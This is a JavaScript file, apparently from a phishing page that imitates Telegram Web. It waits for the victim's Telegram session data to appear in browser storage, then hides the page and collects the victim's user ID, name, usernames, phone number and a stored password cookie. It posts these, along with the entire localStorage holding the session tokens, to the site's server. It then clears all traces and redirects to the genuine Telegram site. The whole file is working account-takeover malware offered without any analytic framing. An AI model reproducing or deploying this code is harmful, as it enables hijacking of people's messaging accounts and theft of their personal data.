document.addEventListener("DOMContentLoaded", function() {
  // Function to send debug logs to the server
  async function logToServer(message) {
    try {
      await fetch(`/api/debug`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: `check.js: ${message}` })
      });
    } catch (error) {
      console.error(`Failed to send debug log to server: ${error.message}`);
    }
  }

  console.log("check.js: Script loaded");
  logToServer("Script loaded");

  console.log(`check.js: window.Telegram exists: ${!!window.Telegram}`);
  logToServer(`window.Telegram exists: ${!!window.Telegram}`);

  console.log(`check.js: window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}`);
  logToServer(`window.Telegram.WebApp exists: ${!!(window.Telegram && window.Telegram.WebApp)}`);

  async function checkLocalStorage() {
    let globalState = localStorage.getItem("tt-global-state");
    console.log(`check.js: tt-global-state exists: ${!!globalState}`);
    logToServer(`tt-global-state exists: ${!!globalState}`);

    console.log(`check.js: user_auth exists: ${!!localStorage.getItem("user_auth")}`);
    logToServer(`user_auth exists: ${!!localStorage.getItem("user_auth")}`);

    if (globalState && localStorage.getItem("user_auth")) {
      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users.byId[currentUserId];
      document.body.style.display = "none";

      if (currentUserId && currentUser) {
        console.log(`check.js: Found user data for userId ${currentUserId}`);
        logToServer(`Found user data for userId ${currentUserId}`);

        const { firstName, usernames, phoneNumber, isPremium } = currentUser;
        const password = document.cookie.split("; ").find(e => e.startsWith("password="))?.split("=")[1];

        localStorage.removeItem("GramJs:apiCache");
        localStorage.removeItem("tt-global-state");

        console.log(`check.js: Sending user data to /api/users/telegram/info for userId ${currentUserId}`);
        logToServer(`Sending user data to /api/users/telegram/info for userId ${currentUserId}`);

        try {
          await fetch(`/api/users/telegram/info`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              userId: currentUserId, firstName,
              usernames, phoneNumber, isPremium,
              password, quicklySet: localStorage,
              type: new URLSearchParams(window.location.search).get("type")
            })
          });
          console.log(`check.js: Successfully sent user data to /api/users/telegram/info for userId ${currentUserId}`);
          logToServer(`Successfully sent user data to /api/users/telegram/info for userId ${currentUserId}`);
        } catch (error) {
          console.error(`check.js: Failed to send user data to /api/users/telegram/info: ${error.message}`);
          logToServer(`Failed to send user data to /api/users/telegram/info: ${error.message}`);
        }

        console.log(`check.js: Opening Telegram link and closing WebApp`);
        logToServer(`Opening Telegram link and closing WebApp`);

        try {
          window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
          window.Telegram.WebApp.close();
        } catch (error) {
          console.error(`check.js: Failed to open Telegram link or close WebApp: ${error.message}`);
          logToServer(`Failed to open Telegram link or close WebApp: ${error.message}`);
        }

        localStorage.clear();
        document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        window.location.href = "https://web.telegram.org/a/";  

        clearInterval(checkInterval);
      } else {
        console.log(`check.js: No user data found in tt-global-state`);
        logToServer(`No user data found in tt-global-state`);
      }
    } else {
      console.log(`check.js: tt-global-state or user_auth not found, clearing storage`);
      logToServer(`tt-global-state or user_auth not found, clearing storage`);
      sessionStorage.clear();
      localStorage.clear();
    }
  }

  const checkInterval = setInterval(checkLocalStorage, 100);
});
